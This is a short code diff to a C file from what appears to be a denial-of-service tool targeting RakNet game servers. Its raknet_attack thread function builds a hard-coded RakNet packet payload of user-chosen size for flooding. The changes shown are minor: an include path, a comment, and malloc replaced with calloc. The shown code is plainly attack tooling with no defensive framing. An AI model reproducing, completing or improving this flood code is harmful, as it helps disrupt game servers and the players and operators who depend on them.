@@ -1,4 +1,4 @@
-#include "raknet_attack.h"
+#include "headers/raknet_attack.h"
 #include <string.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
@@ -14,7 +14,7 @@ void* raknet_attack(void* arg) {
 
     // RakNet payload
     unsigned char raknet_data[] = {
-        0x02, // 0x01 works as well but server does not give timestamps
+        0x02, // 0x01 works as well but server does not give timestamps (this is what i got told)
         0x01, 0x02, 0x4D, 0xFF, 0xFF, 0x00, 0x00, 0xDD,
         0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 
         0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78, 
@@ -23,7 +23,7 @@ void* raknet_attack(void* arg) {
     };
     int pattern_len = sizeof(raknet_data);
     int packet_size = params->psize;
-    unsigned char *packet = malloc(packet_size);
+    unsigned char *packet = calloc(1, packet_size);
     if (!packet) {
         return NULL;
     }
